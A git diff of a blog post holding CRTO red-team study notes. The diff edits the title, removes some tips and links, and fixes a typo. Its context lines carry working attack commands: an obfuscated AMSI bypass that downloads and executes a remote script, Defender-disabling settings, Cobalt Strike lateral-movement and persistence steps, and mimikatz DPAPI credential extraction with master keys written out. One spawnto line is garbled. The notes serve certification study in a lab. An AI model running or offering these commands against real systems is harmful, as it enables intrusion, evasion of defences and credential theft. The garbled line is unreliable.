@@ -1,6 +1,6 @@
 ---
 layout: post
-title: CRTO Notes
+title: CRTO Notes Part I
 date: 2023-11-15
 categories: [Cheatsheet, Study Notes, Zero Point Security]
 tags: [Cheatsheet, Study Notes, Zero Point Security]
@@ -341,8 +341,6 @@ Set-MPPreference -DisableIntrusionPreventionSystem $true
 
 # To make the jump command work and include amsi bypass into it, We need to modify the Resource kit's template.x86.ps1 (for winrm), template.x64.ps1 (for winrm64) and compress.ps1 (for psexec_psh).
 
-# To learn more , Read this blog - https://offensivedefence.co.uk/posts/making-amsi-jump/
-
 S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} ) ; Start-Job -ScriptBlock{iex (iwr http://nickelviper.com/a -UseBasicParsing)}
 
 # Like below
@@ -478,7 +476,6 @@ powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
 # CobaltStrike AggressorScripts for Persistence
 # Copy the aggressor script cna code and paste in the Attacker machine and also copy the sharpersist.exe from Attacker machine Tools and put in the same directory as of persistence cna file.
 https://github.com/Peco602/cobaltstrike-aggressor-scripts/tree/main/persistence-sharpersist
-# Tip : Windows Service Peristence with a onDisk Executable is most reliable in lab (Need Priv to configure)
 ```
 
 ##### Persistence - Task Scheduler (hourly)
@@ -530,7 +527,7 @@ PS C:\> New-Item -Path "HKCU:Software\Classes\CLSID\[ABC-123]" -Name "InprocServ
 PS C:\> New-ItemProperty -Path "HKCU:Software\Classes\CLSID\[ABC-123]\InprocServer32" -Name "ThreadingModel" -Value "Both"
 ```
 
-##### Persistence - Privilleged System User
+##### Persistence - Privileged System User
 
 ```powershell
 # Windows Service
@@ -924,7 +921,6 @@ beacon> spawnas DEV\jking <password> tcp-4444-local
 # using jump
 # This will spawn a Beacon payload on the remote target, and if using a P2P listener, will connect to it automatically.
 # To make the jump command work and include amsi bypass into it, We need to modify the Resource kit's template.x86.ps1 (for winrm), template.x64.ps1 (for winrm64) and compress.ps1 (for psexec_psh).
-# To learn more , Read this blog - https://offensivedefence.co.uk/posts/making-amsi-jump/
 beacon> jump psexec/psexec64/psexec_psh/winrm/winrm64 ComputerName beacon_listener
 
 # Using remote-exec
@@ -936,7 +932,6 @@ beacon> remote-exec winrm ComputerName <execute commands>
 #--------------------------------------------------------------
 
 # Using PSExec (Requires TGS for CIFS)
-# Make sure to change the Post-Ex process for Psexec which is Rundll32.exe by default. We can do it manually using spawnto.
 beacon> ak-settings
 beacon> spawnto x64 %windir%\sysnative\dllhost.exe
 beacon> spawnto x86 %windir%\syswrun klist ow64\dllhost.exe
@@ -993,10 +988,6 @@ beacon> cd \\web.dev.cyberbotic.io\ADMIN$
 beacon> upload c:\Payloads\smb_x64.exe
 beacon> powerpick Invoke-DCOM -ComputerName web.dev.cyberbotic.io -Method MMC20.Application -Command C:\Windows\smb_x64.exe
 beacon> link web.dev.cyberbotic.io agent_vinod
-
-#--------------------------------------------------------------------------------------
-
-## NOTE: While using remote-exec for lateral movement, kindly generate the windows service binary as psexec creates a windows service pointing to uploaded binary for execution
 ```
 
 ### Session Passing
@@ -1128,11 +1119,11 @@ beacon> mimikatz !vault::cred /patch
 # 1. Credentials for task scheduler are stored at below location in encrypted blob
 beacon> ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
 # 2. Find the GUID (guidMasterKey) of Master key associated with encrypted blob (F31...B6E)
-beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E
+beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F31...B6E
 # 3. Dump all the master keys and filter the one we need based on GUID identified in previous step
 beacon> mimikatz !sekurlsa::dpapi
 # 4. Use the Encrypted Blob and Master Key to decrypt and extract plain text password
-beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E /masterkey:10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9
+beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F31...B6E /masterkey:10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9
 
 # Part 2.2: Extracting stored RDP Password
 
@@ -1161,4 +1152,3 @@ beacon> mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft
 # 5. Use Master key to decrypt the credentials blob
 beacon> mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\6C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey:8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214
 ```
-
